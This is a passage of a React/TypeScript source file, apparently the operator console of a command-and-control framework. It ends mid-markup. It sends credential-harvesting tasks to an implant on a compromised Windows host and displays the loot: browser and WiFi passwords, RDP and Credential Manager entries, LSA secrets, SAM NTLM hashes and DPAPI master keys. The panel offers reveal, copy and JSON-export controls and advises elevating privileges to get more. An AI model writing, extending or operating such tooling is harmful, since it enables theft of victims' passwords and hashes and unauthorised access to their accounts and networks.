import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import {
  KeyRound, Eye, EyeOff, Copy, Download, RefreshCw, AlertTriangle,
  CheckCircle2, Clock, Lock, ShieldAlert,
} from 'lucide-react'
import type { Session } from '../types'
import { credentialApi } from '../api'
import './CredentialsPanel.css'

interface CredentialsPanelProps {
  session: Session
  /**
   * 面板是否可见。SessionDetail 目前不传（它用 hidden + display:none 保留节点），
   * 此时组件自己探测：IntersectionObserver + 祖先 hidden/style 的 MutationObserver。
   * 以后父组件愿意把 ctx.visible 透传进来时，这个 prop 优先，自动探测自动关闭。
   */
  visible?: boolean
}

/** 单条凭据（各类 action 的字段并集：分段后前端按 action 选列渲染）。 */
interface CredentialEntry {
  type?: string
  browser?: string; url?: string; username?: string; password?: string
  ssid?: string; target_name?: string; name?: string; source?: string; profile?: string
  encrypted_data?: string; plaintext?: string; encrypted_old_data?: string
  data?: string; is_rdp?: string; error?: string; target?: string
  sid?: string; file_name?: string; file_path?: string; file_size?: string; mod_time?: string
  /** "密文未解密"标记（例如 v20 的 DPAPI blob）：显式展示，绝不当成空密码。 */
  encrypted?: string
  needs_admin?: boolean
}

/**
 * 凭据结果的一段（一个 action 一段，植入端保证每段 ≤ 64 KiB）。
 *
 * 字段口径与服务端/植入端一致（internal/server/builder/implant/credentials_windows.go）：
 *   count=收集总数 returned=实际返回数 omitted=因段上限被丢弃数 bytes=该段完整 JSON 字节数
 *   truncated=该段是否被截断 error=该段失败原因 needs_admin=非管理员+管理员专属能力
 *   duration_ms=该段耗时（后端若按段给出就展示，用于定位"到底哪一段慢"）
 */
interface CredentialSegment {
  action?: string
  label?: string
  count?: number
  returned?: number
  omitted?: number
  bytes?: number
  truncated?: boolean
  needs_admin?: boolean
  error?: string
  duration_ms?: number
  data?: CredentialEntry[]
}

interface CredentialResults {
  action?: string
  elevated?: boolean
  duration_ms?: number
  total_count?: number
  returned_count?: number
  truncated?: boolean
  /** 后端如果直接统计未解密的 v20 条数就用它，否则前端按条目自算。 */
  undecryptable_v20?: number
  notes?: string[]
  browser?: CredentialSegment
  wifi?: CredentialSegment
  rdp?: CredentialSegment
  lsa?: CredentialSegment
  sam?: CredentialSegment
  dpapi?: CredentialSegment
}

interface TaskDetail {
  status?: string
  output?: string
  error?: string
  exit_code?: number
  output_raw_bytes?: number
  truncated?: boolean
  output_bytes_original?: number
  output_max_bytes?: number
  output_bytes?: number
}

/** 轮询总超时：这是**等待上限**，不是收集耗时；界面上必须与 duration_ms 分开写。 */
const CREDENTIALS_POLL_TIMEOUT_MS = 200_000
/** 轮询间隔（前几次快速探测，之后拉长）。 */
const POLL_INTERVALS = [0, 200, 300, 500, 800, 1200, 2000]
/** 单次 GET /tasks/{id} 的超时，避免一次卡住的请求吃掉总预算。 */
const POLL_REQUEST_TIMEOUT_MS = 10_000
/** 等待上限的展示值（秒）。 */
const POLL_CAP_SEC = CREDENTIALS_POLL_TIMEOUT_MS / 1000
/** 密码默认打码用的占位符（不是明文）。 */
const MASK = '••••••'

type Phase = 'idle' | 'dispatched' | 'running' | 'done' | 'timeout' | 'error'
type SegmentKey = 'browser' | 'wifi' | 'rdp' | 'lsa' | 'sam' | 'dpapi'
type TabKey = 'all' | SegmentKey
type Tone = 'ok' | 'warn' | 'danger' | 'info' | 'muted'

const SEGMENT_ORDER: SegmentKey[] = ['browser', 'wifi', 'rdp', 'lsa', 'sam', 'dpapi']
const TAB_ORDER: TabKey[] = ['all', ...SEGMENT_ORDER]

const SEGMENT_LABELS: Record<SegmentKey, string> = {
  browser: '浏览器密码',
  wifi: 'WiFi 密码',
  rdp: 'RDP / 凭据管理器',
  lsa: 'LSA Secrets',
  sam: 'SAM 哈希',
  dpapi: 'DPAPI 主密钥',
}
const SEGMENT_SHORT: Record<SegmentKey, string> = {
  browser: '浏览器', wifi: 'WiFi', rdp: 'RDP', lsa: 'LSA', sam: 'SAM', dpapi: 'DPAPI',
}

interface Badge { text: string; tone: Tone; title?: string }

/** 统一后的一行：所有分段都落到 用户名 / 密码 / 来源 / 状态 四列。 */
interface CredRow {
  id: string
  segment: SegmentKey
  segmentLabel: string
  username: string
  password: string
  passwordKind: 'password' | 'hash' | 'blob' | 'none'
  source: string
  /** v20 / v10 / v11 / hex：密文未解密时的标记（此时 password 为空串，但界面不显示空白）。 */
  encTag: '' | 'v20' | 'v10' | 'v11' | 'hex'
  ciphertext?: string
  error?: string
  needsAdmin?: boolean
  badges: Badge[]
}

interface SegmentView {
  seg?: CredentialSegment
  rows: CredRow[]
  count: number
  returned: number
  omitted: number
  v20: number
}

function sleep(ms: number) {
  return new Promise((r) => setTimeout(r, ms))
}

/** 把服务端错误原文取出来（axios 错误 / 纯文本 / 未知异常），绝不吞成"请求失败"。 */
function extractServerError(err: any): string {
  const body = err?.response?.data
  if (typeof body === 'string' && body.trim()) {
    try {
      const parsed = JSON.parse(body)
      if (parsed?.error) return String(parsed.error)
    } catch { /* 非 JSON：原样展示 */ }
    return body
  }
  if (body && typeof body === 'object') {
    if (body.error) return String(body.error)
    if (body.message) return String(body.message)
  }
  if (err?.message) return String(err.message)
  return '请求失败（服务端未返回原因）'
}

/**
 * 耗时格式化：**只在真正的毫秒数上加 " ms"**，绝不把 duration_ms 乘 1000 或直接写 "s"。
 * < 1s 时按毫秒展示（"451 ms"），否则同时给出秒与毫秒，避免"200"这种裸数字被误读。
 */
function formatDurationMs(ms?: number): string {
  if (typeof ms !== 'number' || !Number.isFinite(ms) || ms < 0) return '—'
  if (ms < 1000) return `${Math.round(ms)} ms`
  if (ms < 60_000) return `${(ms / 1000).toFixed(2)} s（${Math.round(ms)} ms）`
  const totalSec = Math.round(ms / 1000)
  const m = Math.floor(totalSec / 60)
  const s = totalSec % 60
  return `${m} 分 ${s} 秒（${Math.round(ms)} ms）`
}

function formatSeconds(ms: number): string {
  return `${Math.floor(ms / 1000)} s`
}

function formatBytes(n?: number): string {
  if (!n || n <= 0) return '0 B'
  if (n < 1024) return `${n} B`
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KiB`
  return `${(n / (1024 * 1024)).toFixed(2)} MiB`
}

function shortCipher(s: string, max = 40): string {
  return s.length > max ? `${s.slice(0, max)}…` : s
}

/** 复制：优先 navigator.clipboard；失败回落 execCommand；两者都失败就静默（不弹错）。 */
async function copySilently(text: string): Promise<boolean> {
  if (!text) return false
  try {
    if (navigator.clipboard?.writeText) {
      await navigator.clipboard.writeText(text)
      return true
    }
  } catch { /* 权限/非安全上下文：走兜底，不打扰操作员 */ }
  try {
    const ta = document.createElement('textarea')
    ta.value = text
    ta.setAttribute('readonly', '')
    ta.style.position = 'fixed'
    ta.style.opacity = '0'
    ta.style.pointerEvents = 'none'
    document.body.appendChild(ta)
    ta.select()
    const ok = document.execCommand('copy')
    document.body.removeChild(ta)
    return ok
  } catch {
    return false
  }
}

/**
 * v20 密文识别：有的实现放在 `encrypted`，有的解不开时会原样塞在 `password`。
 * 只把 v20 计入"未解密 v20"统计；v10/v11 也按密文展示（浏览器旧格式）。
 */
function cipherOf(entry: CredentialEntry): { tag: CredRow['encTag']; text: string } {
  const enc = (entry.encrypted || '').trim()
  if (/^v20/i.test(enc)) return { tag: 'v20', text: enc }
  const pw = (entry.password || '').trim()
  if (/^v20/i.test(pw)) return { tag: 'v20', text: pw }
  const enc2 = (entry.encrypted_data || '').trim()
  // LSA 的 CurrVal 是 hex 密文；带 plaintext 时才有可读明文。
  if (enc2 && !entry.plaintext) return { tag: 'hex', text: enc2 }
  if (/^v10/i.test(pw)) return { tag: 'v10', text: pw }
  if (/^v11/i.test(pw)) return { tag: 'v11', text: pw }
  return { tag: '', text: '' }
}

function buildRows(key: SegmentKey, seg: CredentialSegment): CredRow[] {
  const list = Array.isArray(seg.data) ? seg.data : []
  return list.map((e, i) => {
    const badges: Badge[] = []
    const add = (text: string, tone: Tone, title?: string) => { badges.push({ text, tone, title }) }
    let username = ''
    let password = ''
    let passwordKind: CredRow['passwordKind'] = 'password'
    let source = ''

    switch (key) {
      case 'browser':
        username = e.username || ''
        password = e.password || ''
        source = e.url || e.source || ''
        if (e.browser) add(e.browser, 'info', '浏览器')
        break
      case 'wifi':
        username = e.ssid || e.name || ''
        password = e.password || ''
        source = e.profile || (username ? `WiFi 配置文件：${username}` : 'WiFi 配置文件')
        if (username) add('WiFi SSID', 'info', username)
        break
      case 'rdp':
        username = e.username || ''
        password = e.password || ''
        source = e.target_name || e.target || ''
        if (e.type) add(e.type, 'muted', '凭据类型')
        if (String(e.is_rdp || '').toLowerCase() === 'true') add('RDP', 'info', 'TargetName 属于 RDP 凭据')
        break
      case 'lsa':
        username = e.name || e.source || ''
        source = e.source || 'LSA Secrets'
        password = e.plaintext || e.data || ''
        passwordKind = e.plaintext ? 'password' : 'blob'
        if (e.plaintext) add('明文', 'ok')
        if (e.data) add('LSA 密钥数据', 'info')
        break
      case 'sam':
        username = e.username || ''
        source = e.source || 'SAM'
        password = e.data || ''
        passwordKind = 'hash'
        if (e.type === 'syskey') add('SYSKEY', 'info', 'SAM 启动密钥')
        else add('NTLM 哈希', 'info', 'SAM 记录，不是明文密码')
        break
      case 'dpapi':
        username = e.sid || ''
        source = e.file_path || e.file_name || ''
        if (e.file_size) add(formatBytes(Number(e.file_size)), 'muted', '主密钥文件大小')
        if (e.mod_time) add(e.mod_time, 'muted', '文件修改时间')
        break
    }

    const cipher = cipherOf(e)
    if (cipher.tag) {
      // 密文未解密：密码列显式标注，不当空白（也不显示成可复制的明文）。
      password = ''
      add(
        cipher.tag === 'v20' ? 'v20 密文（未解密）'
          : cipher.tag === 'hex' ? '密文（hex，未解密）'
            : `${cipher.tag} 密文（未解密）`,
        'warn',
        shortCipher(cipher.text, 160),
      )
    } else if (!password && !e.error && passwordKind === 'password') {
      add('空密码', 'muted', '条目存在，但密码字段是空字符串')
    }
    if (e.needs_admin) add('需要管理员', 'warn')
    if (e.error) add('错误', 'danger', e.error)

    return {
      id: `${key}-${i}`,
      segment: key,
      segmentLabel: SEGMENT_LABELS[key],
      username,
      password,
      passwordKind,
      source,
      encTag: cipher.tag,
      ciphertext: cipher.text || undefined,
      error: e.error,
      needsAdmin: e.needs_admin,
      badges,
    }
  })
}

/** 轮询结果：done=任务终态，timeout=总超时（任务可能仍在执行），error=请求层失败，cancelled=换任务/卸载。 */
interface PollOutcome {
  kind: 'done' | 'timeout' | 'error' | 'cancelled'
  task?: TaskDetail
  error?: string
  /** 可见等待时长（隐藏期间不计时）。 */
  elapsedMs: number
}

interface PollHooks {
  /** 面板当前是否可见（父节点 display:none / hidden 时为 false）。 */
  isVisible: () => boolean
  /** 隐藏时挂起，直到再次可见（不清任务、不重复下发）。 */
  waitVisible: () => Promise<void>
  /** 本轮轮询是否已被取消（组件卸载 / 下发了新任务）。 */
  isCancelled: () => boolean
  onProgress: (elapsedMs: number) => void
  onPause: (elapsedMs: number) => void
  onResume: (elapsedMs: number) => void
}

/** 单次 GET /tasks/{id}：带超时；非 2xx 时把服务端原文一并带回（不吞错误）。 */
async function fetchTaskOnce(
  taskId: number,
  timeoutMs: number,
): Promise<{ ok: boolean; status: number; task?: TaskDetail; errorText?: string }> {
  const token = localStorage.getItem('toshell-token')
  const ctrl = new AbortController()
  const timer = setTimeout(() => ctrl.abort(), Math.max(1500, timeoutMs))
  try {
    const resp = await fetch(`/api/v1/tasks/${taskId}`, {
      headers: token ? { Authorization: `Bearer ${token}` } : undefined,
      signal: ctrl.signal,
    })
    const text = await resp.text()
    if (!resp.ok) {
      let msg = text
      try {
        const parsed = JSON.parse(text)
        if (parsed?.error) msg = String(parsed.error)
      } catch { /* 非 JSON：原样展示 */ }
      return { ok: false, status: resp.status, errorText: msg || `HTTP ${resp.status}` }
    }
    try {
      return { ok: true, status: resp.status, task: JSON.parse(text) as TaskDetail }
    } catch {
      return { ok: false, status: resp.status, errorText: `任务详情不是合法 JSON：${text.slice(0, 300)}` }
    }
  } finally {
    clearTimeout(timer)
  }
}

/**
 * 带总等待上限的轮询。
 *
 * 与旧实现的区别：**面板隐藏时完全不发请求**，等待上限也只在"可见时间"里计时
 * （切走 5 分钟不会把 200s 预算烧光，也不会误报超时）；恢复可见后从同一个
 * taskId 继续轮询，不重新下发任务。200s 只是等待上限，收集耗时看结果里的 duration_ms。
 */
async function pollTaskResult(taskId: number, hooks: PollHooks): Promise<PollOutcome> {
  const startedAt = Date.now()
  let hiddenAccumMs = 0
  let hiddenAt: number | null = null
  let lastErr = ''
  let justResumed = false
  let attempt = 0

  const visibleElapsed = () => {
    const now = Date.now()
    const inHidden = hiddenAt !== null ? now - hiddenAt : 0
    return now - startedAt - hiddenAccumMs - inHidden
  }

  for (;;) {
    if (hooks.isCancelled()) return { kind: 'cancelled', elapsedMs: visibleElapsed() }

    // ── 隐藏 → 挂起（不请求 /tasks；计时也暂停）──
    if (!hooks.isVisible()) {
      if (hiddenAt === null) {
        hiddenAt = Date.now()
        hooks.onPause(visibleElapsed())
      }
      await hooks.waitVisible()
      if (hooks.isCancelled()) return { kind: 'cancelled', elapsedMs: visibleElapsed() }
      if (hiddenAt !== null) {
        hiddenAccumMs += Date.now() - hiddenAt
        hiddenAt = null
        justResumed = true
        hooks.onResume(visibleElapsed())
      }
      continue
    }

    if (visibleElapsed() >= CREDENTIALS_POLL_TIMEOUT_MS && !justResumed) {
      return { kind: 'timeout', elapsedMs: visibleElapsed(), error: lastErr }
    }
    justResumed = false

    const remaining = Math.max(1500, CREDENTIALS_POLL_TIMEOUT_MS - visibleElapsed())
    try {
      const res = await fetchTaskOnce(taskId, Math.min(POLL_REQUEST_TIMEOUT_MS, remaining))
      if (!res.ok) {
        // 404 = 任务已不存在（被清理）：直接结束，把服务端原文交给界面
        if (res.status === 404) {
          return { kind: 'error', error: res.errorText, elapsedMs: visibleElapsed() }
        }
        lastErr = res.errorText || lastErr
      } else {
        const t = res.task || {}
        const status = String(t.status || '').toLowerCase()
        if (status === 'completed' || status === 'failed' || status === 'timeout') {
          return { kind: 'done', task: t, elapsedMs: visibleElapsed() }
        }
      }
    } catch (err: any) {
      // 网络错误/中止：先记下，继续轮询到等待上限（界面不会卡死）
      lastErr = err?.name === 'AbortError' ? '单次轮询请求超时' : (err?.message || String(err))
    }

    if (hooks.isCancelled()) return { kind: 'cancelled', elapsedMs: visibleElapsed() }
    hooks.onProgress(visibleElapsed())
    await sleep(POLL_INTERVALS[Math.min(attempt, POLL_INTERVALS.length - 1)])
    attempt++
  }
}

export function CredentialsPanel({ session, visible: visibleProp }: CredentialsPanelProps) {
  const [action, setAction] = useState('all')
  const [loading, setLoading] = useState(false)
  const [phase, setPhase] = useState<Phase>('idle')
  const [stageText, setStageText] = useState('')
  const [elapsedMs, setElapsedMs] = useState(0)
  const [pollPaused, setPollPaused] = useState(false)
  const [results, setResults] = useState<CredentialResults | null>(null)
  const [serverError, setServerError] = useState('')
  const [rawOutput, setRawOutput] = useState('')
  const [lastTaskId, setLastTaskId] = useState<number | null>(null)

  // 结果表格状态
  const [activeTab, setActiveTab] = useState<TabKey>('all')
  const [revealAll, setRevealAll] = useState(false)
  const [revealedRows, setRevealedRows] = useState<Set<string>>(() => new Set())
  const [hiddenRows, setHiddenRows] = useState<Set<string>>(() => new Set())
  const [copiedId, setCopiedId] = useState('')
  const [panelVisible, setPanelVisible] = useState(true)

  const rootRef = useRef<HTMLDivElement | null>(null)
  const mountedRef = useRef(true)
  const visibleRef = useRef(true)
  const waitersRef = useRef<Set<() => void>>(new Set())
  const runIdRef = useRef(0)
  const copyTimerRef = useRef<number | undefined>(undefined)

  /**
   * 可见性变更：只在 false → true 时唤醒等待中的轮询（同一个 taskId 续上），
   * 隐藏期间轮询循环停在 waitVisible()，一个 /tasks 请求都不会发。
   */
  const applyVisibility = useCallback((next: boolean) => {
    if (visibleRef.current === next) return
    visibleRef.current = next
    setPanelVisible(next)
    if (next) {
      const pending = Array.from(waitersRef.current)
      waitersRef.current.clear()
      pending.forEach((resolve) => resolve())
    }
  }, [])

  const waitVisible = useCallback(() => {
    if (visibleRef.current) return Promise.resolve()
    return new Promise<void>((resolve) => { waitersRef.current.add(resolve) })
  }, [])

  // 卸载：标记 + 唤醒挂起的轮询 + 取消计时器（防止隐藏期间卸载后 Promise 永久挂住）
  useEffect(() => {
    mountedRef.current = true
    return () => {
      mountedRef.current = false
      runIdRef.current += 1
      const pending = Array.from(waitersRef.current)
      waitersRef.current.clear()
      pending.forEach((resolve) => resolve())
      if (copyTimerRef.current !== undefined) window.clearTimeout(copyTimerRef.current)
    }
  }, [])

  // 父组件显式传 visible 时以它为准。
  useEffect(() => {
    if (typeof visibleProp === 'boolean') applyVisibility(visibleProp)
  }, [visibleProp, applyVisibility])

  /**
   * 自动探测可见性：SessionDetail 的 tabpanel 切走时给容器加 `hidden` + display:none，
   * 节点保留在 DOM 里。这里同时观察 IntersectionObserver（滚出视口/窗口隐藏）和
   * 祖先的 hidden/style/class 变更（display:none 切换），只读布局、不发请求。
   */
  useEffect(() => {
    if (typeof visibleProp === 'boolean') return
    const el = rootRef.current
    if (!el) return
    const check = () => {
      applyVisibility(el.getClientRects().length > 0 && document.visibilityState !== 'hidden')
    }
    check()
    let io: IntersectionObserver | null = null
    if (typeof IntersectionObserver !== 'undefined') {
      io = new IntersectionObserver(check, { threshold: 0 })
      io.observe(el)
    }
    const mo = new MutationObserver(check)
    for (let node: Element | null = el; node && node !== document.documentElement; node = node.parentElement) {
      mo.observe(node, { attributes: true, attributeFilter: ['hidden', 'style', 'class'] })
    }
    document.addEventListener('visibilitychange', check)
    window.addEventListener('resize', check)
    return () => {
      io?.disconnect()
      mo.disconnect()
      document.removeEventListener('visibilitychange', check)
      window.removeEventListener('resize', check)
    }
  }, [visibleProp, applyVisibility])

  // ── 结果整理：每段统一成 用户名 / 密码 / 来源 / 状态 四列 ──
  const view = useMemo(() => {
    const per = {} as Record<SegmentKey, SegmentView>
    for (const key of SEGMENT_ORDER) {
      const seg = results ? results[key] : undefined
      const rows = seg ? buildRows(key, seg) : []
      const count = typeof seg?.count === 'number' ? seg.count : rows.length
      const returned = typeof seg?.returned === 'number' ? seg.returned : rows.length
      const omitted = typeof seg?.omitted === 'number' ? seg.omitted : Math.max(0, count - returned)
      per[key] = { seg, rows, count, returned, omitted, v20: rows.filter((r) => r.encTag === 'v20').length }
    }
    const allRows = SEGMENT_ORDER.flatMap((key) => per[key].rows)
    const segTotal = SEGMENT_ORDER.reduce((sum, key) => sum + per[key].count, 0)
    const segReturned = SEGMENT_ORDER.reduce((sum, key) => sum + per[key].returned, 0)
    const totalCount = results
      ? (typeof results.total_count === 'number' ? results.total_count : segTotal)
      : 0
    const returnedCount = results
      ? (typeof results.returned_count === 'number' ? results.returned_count : segReturned)
      : 0
    const segOmitted = SEGMENT_ORDER.reduce((sum, key) => sum + per[key].omitted, 0)
    const omittedCount = Math.max(segOmitted, Math.max(0, totalCount - returnedCount))
    const truncated = !!results?.truncated || SEGMENT_ORDER.some((key) => !!per[key].seg?.truncated)
    const computedV20 = allRows.filter((r) => r.encTag === 'v20').length
    const v20Count = typeof results?.undecryptable_v20 === 'number'
      ? results.undecryptable_v20
      : computedV20
    return {
      per, allRows, totalCount, returnedCount, omittedCount, truncated, v20Count,
      durationMs: results?.duration_ms,
      elevated: results?.elevated,
    }
  }, [results])

  const rows = activeTab === 'all' ? view.allRows : view.per[activeTab].rows
  const activeSegment = activeTab === 'all' ? null : view.per[activeTab]

  const isRevealed = (id: string) => (revealAll ? !hiddenRows.has(id) : revealedRows.has(id))

  const toggleRow = (id: string) => {
    const currentlyVisible = revealAll ? !hiddenRows.has(id) : revealedRows.has(id)
    if (revealAll) {
      setHiddenRows((prev) => {
        const next = new Set(prev)
        if (currentlyVisible) next.add(id); else next.delete(id)
        return next
      })
    } else {
      setRevealedRows((prev) => {
        const next = new Set(prev)
        if (currentlyVisible) next.delete(id); else next.add(id)
        return next
      })
    }
  }

  const handleCopy = useCallback(async (text: string, id: string) => {
    const ok = await copySilently(text)
    if (!ok || !mountedRef.current) return // 复制失败静默：不打扰操作员
    setCopiedId(id)
    if (copyTimerRef.current !== undefined) window.clearTimeout(copyTimerRef.current)
    copyTimerRef.current = window.setTimeout(() => {
      if (mountedRef.current) setCopiedId((cur) => (cur === id ? '' : cur))
    }, 1600)
  }, [])

  const handleCollect = async () => {
    const runId = ++runIdRef.current
    setLoading(true)
    setPhase('dispatched')
    setStageText('已下发：正在把凭据收集任务推送给植入端…')
    setElapsedMs(0)
    setPollPaused(false)
    setResults(null)
    setServerError('')
    setRawOutput('')
    setLastTaskId(null)
    setActiveTab('all')
    setRevealAll(false)
    setRevealedRows(new Set())
    setHiddenRows(new Set())
    setCopiedId('')

    try {
      const resp = await credentialApi.collect(session.id, action)
      const data = (resp as any)?.data || {}
      const taskId: number | undefined = data.task_id
      if (!taskId) {
        throw new Error(`服务端未返回 task_id（原文：${JSON.stringify(data)}）`)
      }
      setLastTaskId(taskId)
      setPhase('running')
      setStageText(`已下发任务 #${taskId}，等待植入端执行…`)

      const outcome = await pollTaskResult(taskId, {
        isVisible: () => visibleRef.current,
        waitVisible,
        isCancelled: () => !mountedRef.current || runIdRef.current !== runId,
        onProgress: (elapsed) => {
          if (!mountedRef.current || runIdRef.current !== runId) return
          setElapsedMs(elapsed)
          setStageText(`执行中：任务 #${taskId}，已等待 ${formatSeconds(elapsed)} / 等待上限 ${POLL_CAP_SEC} s`)
        },
        onPause: (elapsed) => {
          if (!mountedRef.current || runIdRef.current !== runId) return
          setElapsedMs(elapsed)
          setPollPaused(true)
          setStageText(
            `轮询已暂停：本页不可见时不请求任务状态（已等待 ${formatSeconds(elapsed)} / 等待上限 ${POLL_CAP_SEC} s）；` +
            `切回本页后任务 #${taskId} 自动续上，不会重复下发。`,
          )
        },
        onResume: (elapsed) => {
          if (!mountedRef.current || runIdRef.current !== runId) return
          setElapsedMs(elapsed)
          setPollPaused(false)
          setStageText(`继续轮询：任务 #${taskId}，已等待 ${formatSeconds(elapsed)} / 等待上限 ${POLL_CAP_SEC} s`)
        },
      })
      if (!mountedRef.current || runIdRef.current !== runId) return
      setPollPaused(false)
      setElapsedMs(outcome.elapsedMs)

      if (outcome.kind === 'cancelled') return

      if (outcome.kind === 'timeout') {
        setPhase('timeout')
        setStageText(
          `等待上限 ${POLL_CAP_SEC} s 已到：任务 #${taskId} 可能仍在执行。` +
          '这是**前端等待上限**，不是收集耗时；稍后可到任务页回看（植入端重活超时为 180s）。',
        )
        if (outcome.error) setServerError(outcome.error)
        return
      }
      if (outcome.kind === 'error') {
        setPhase('error')
        setServerError(outcome.error || '轮询任务失败')
        setStageText(`轮询失败：任务 #${taskId}`)
        return
      }

      const task = outcome.task || {}
      const status = String(task.status || '').toLowerCase()
      const taskError = (task.error || '').trim()
      if (taskError) setServerError(taskError)

      // 失败任务也可能带回可解析的分段结果（例如 LSA 无权限：output 有分段 JSON、
      // error 写"需要管理员权限"）：先尝试解析 output，再决定展示形态。
      const output = task.output || ''
      let parsed: CredentialResults | null = null
      if (output.trim()) {
        try {
          parsed = JSON.parse(output) as CredentialResults
        } catch {
          parsed = null
        }
      }

      if (parsed) {
        setResults(parsed)
        if (status === 'completed' && !taskError) {
          setPhase('done')
          setStageText(`已完成：任务 #${taskId}，结果已就绪（本次取值耗时见结果统计）`)
        } else {
          setPhase('error')
          setStageText(`任务结束（状态 ${status}）：已展示分段结果，错误见下方服务端原文`)
        }
      } else if (output.trim()) {
        // 不是预期的 JSON（老载荷/非 Windows 的英文错误文本等）：原样展示，不吞。
        setRawOutput(output)
        setPhase(status === 'completed' ? 'done' : 'error')
        setStageText(`任务结束（状态 ${status}）：返回内容不是分段 JSON，已原样展示`)
      } else if (status === 'completed' && !taskError) {
        setPhase('error')
        setServerError('服务端返回 completed，但结果是空字符串（没有可解析的分段结果）')
        setStageText(`任务 #${taskId} 已完成但结果为空`)
      } else {
        setPhase('error')
        setStageText(`任务失败（状态 ${status}）`)
        if (!taskError) setServerError('任务失败，但服务端未返回错误文本')
      }
    } catch (err: any) {
      if (!mountedRef.current || runIdRef.current !== runId) return
      setPhase('error')
      setServerError(extractServerError(err))
      setStageText('下发失败')
    } finally {
      if (mountedRef.current && runIdRef.current === runId) setLoading(false)
    }
  }

  const handleExportJSON = () => {
    if (!results) return
    const blob = new Blob([JSON.stringify(results, null, 2)], { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url; a.download = `credentials_${session.hostname}_${Date.now()}.json`
    a.click(); URL.revokeObjectURL(url)
  }

  const emptyReasonFor = (tab: TabKey): string => {
    if (tab === 'all') return '所有分段均为 0 条，或本次动作未返回任何分段数据'
    const v = view.per[tab]
    const seg = v.seg
    if (!seg) return '本次动作不包含该类别（服务端未返回这一段）'
    if (seg.needs_admin) return '需要管理员权限（当前为普通用户权限）'
    if (seg.error) return seg.error
    if (v.count > 0 && v.returned === 0) return '条目超过单段 64 KiB 上限，全部被省略（完整结果见任务 JSON）'
    if (v.count > 0) return '服务端声明有数据，但 data 为空（请查看任务 JSON）'
    return '目标系统未保存该类凭据，或采集器未返回数据'
  }

  /** 段内提示：v20 / 需要管理员 / 错误 / 截断，全部用醒目样式。 */
  const renderSegmentBanners = (key: SegmentKey, withTruncated: boolean) => {
    const v = view.per[key]
    const seg = v.seg
    if (!seg) return null
    const label = SEGMENT_LABELS[key]
    return (
      <>
        {typeof seg.duration_ms === 'number' && (
          <div className="credv2-meta" key={`${key}-duration`} data-testid={`cred-seg-duration-${key}`}>
            该段耗时 {formatDurationMs(seg.duration_ms)}
            {typeof seg.bytes === 'number' && ` · 段大小 ${formatBytes(seg.bytes)}`}
          </div>
        )}
        {v.v20 > 0 && (
          <div
            className="credv2-banner credv2-banner-warn"
            key={`${key}-v20`}
            data-testid={key === 'browser' ? 'cred-banner-v20' : `cred-banner-v20-${key}`}
          >
            <Lock size={14} />
            <span>
              <strong>{label}</strong>：{v.v20} 条密码是 <code>v20</code> 密文，本次未能解密。
              密文不会显示成空白——需要目标机的 DPAPI 主密钥才能解开（完整密文见任务 JSON）。
            </span>
          </div>
        )}
        {seg.needs_admin && (
          <div
            className="credv2-banner credv2-banner-warn"
            key={`${key}-admin`}
            data-testid={`cred-banner-admin-${key}`}
          >
            <ShieldAlert size={14} />
            <span>
              <strong>{label}：需要管理员权限</strong>，本次会话是普通用户，未取到数据
              {seg.error ? `（原因：${seg.error}）` : ''}。提权后重新收集即可。
            </span>
          </div>
        )}
        {seg.error && !seg.needs_admin && (
          <div className="credv2-banner credv2-banner-danger" key={`${key}-error`} data-testid={`cred-banner-error-${key}`}>
            <AlertTriangle size={14} />
            <span><strong>{label}：采集失败</strong>。{seg.error}</span>
          </div>
        )}
        {withTruncated && seg.truncated && (
          <div
            className="credv2-banner credv2-banner-warn"
            key={`${key}-truncated`}
            data-testid={`cred-banner-truncated-${key}`}
          >
            <AlertTriangle size={14} />
            <span><strong>{label}</strong>：已省略 {v.omitted} 条，完整结果见任务 JSON（单段 64 KiB 上限）。</span>
          </div>
        )}
      </>
    )
  }

  const renderPasswordCell = (row: CredRow) => {
    if (row.encTag) {
      const tag = row.encTag === 'hex' ? 'hex 密文' : `${row.encTag} 密文`
      return (
        <span className="credv2-secret credv2-secret-undecrypted" title={shortCipher(row.ciphertext || '', 300)}>
          <Lock size={12} />
          <span>未解密（{tag}）</span>
        </span>
      )
    }
    if (!row.password) {
      return (
        <span className="credv2-secret-none" title={row.error || '该条目没有密码/哈希字段'}>
          — 无密码字段
        </span>
      )
    }
    const shown = isRevealed(row.id)
    return (
      <span className="credv2-secret">
        <code
          className={shown ? 'credv2-code' : 'credv2-code credv2-code-masked'}
          title={shown ? row.password : '密码已打码（点击"显示"查看）'}
        >
          {shown ? row.password : MASK}
        </code>
        <button
          type="button"
          className="credv2-btn credv2-btn-xs"
          onClick={() => toggleRow(row.id)}
          title={shown ? '隐藏密码' : '显示密码'}
          data-testid={`cred-reveal-${row.id}`}
        >
          {shown ? <EyeOff size={12} /> : <Eye size={12} />}
          {shown ? '隐藏' : '显示'}
        </button>
        <button
          type="button"
          className="credv2-icon-btn"
          onClick={() => handleCopy(row.password, row.id)}
          title="复制密码"
          aria-label="复制密码"
          data-testid={`cred-copy-${row.id}`}
        >
          <Copy size={12} />
        </button>
        {copiedId === row.id && <span className="credv2-copied">已复制</span>}
      </span>
    )
  }

  const progressPct = Math.min(100, Math.round((elapsedMs / CREDENTIALS_POLL_TIMEOUT_MS) * 100))
  const stageIndex = phase === 'done' ? 2 : (phase === 'running' ? 1 : (phase === 'dispatched' ? 0 : -1))

  const tabMeta = (tab: TabKey) => {
    if (tab === 'all') {
      return {
        label: '全部',
        count: view.totalCount,
        returned: view.returnedCount,
        v20: view.v20Count,
        needsAdmin: SEGMENT_ORDER.some((key) => !!view.per[key].seg?.needs_admin),
        hasError: SEGMENT_ORDER.some((key) => !!view.per[key].seg?.error),
      }
    }
    const v = view.per[tab]
    return {
      label: SEGMENT_LABELS[tab],
      count: v.count,
      returned: v.returned,
      v20: v.v20,
      needsAdmin: !!v.seg?.needs_admin,
      hasError: !!v.seg?.error,
    }
  }

  return (
    <div className="credentials-panel" ref={rootRef}>
      <div className="cred-toolbar">
        <div className="cred-toolbar-left">
          <KeyRound size={18} />
          <span className="cred-title">凭据收集 — {session.hostname}</span>
        </div>
        <div className="cred-toolbar-right">
          <select className="cred-select" value={action} onChange={(e) => setAction(e.target.value)} disabled={loading}>
            <option value="all">全部</option>
            <option value="browser">浏览器密码</option>
            <option value="wifi">WiFi 密码</option>
            <option value="rdp">RDP 凭据</option>
            <option value="lsa">LSA Secrets</option>
            <option value="sam">SAM 哈希</option>
